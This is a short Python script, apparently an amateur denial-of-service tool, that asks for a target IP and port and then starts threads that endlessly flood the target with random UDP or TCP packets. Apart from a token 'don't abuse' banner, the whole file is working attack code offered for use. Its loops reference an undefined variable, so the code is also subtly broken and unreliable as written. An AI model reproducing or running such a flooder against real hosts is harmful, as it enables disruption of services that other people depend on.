#!/usr/bin/env python3
#Code by Akatsuki Itachi
import random
import socket
import threading
import os

os.system("clear")
print("\033[91m     ====================================   \n")
print("      [!] Author Tools : Akatsuki Itachi                                          ")
print("      [Note] : Please Don't Abuse Okay                                  \n")
print("     ====================================   ")

print(" TOOLS BY AKATSUKI ITACHI NIH DEK\033[91m")

ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" ATTACK ? (y/n) : "))
paket = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[POK!!]","[POK!!]","[POK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NIH PACKET DARI AKATSUKI ITACHI")
		except:
			print("[!] MT KAH MANIEZ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[POK!!]","[POK!!]","[POK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NIH PACKET DARI AKATSUKI ITACHI")
		except:
			s.close()
			print("[*] MT KAH MANIEZ")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()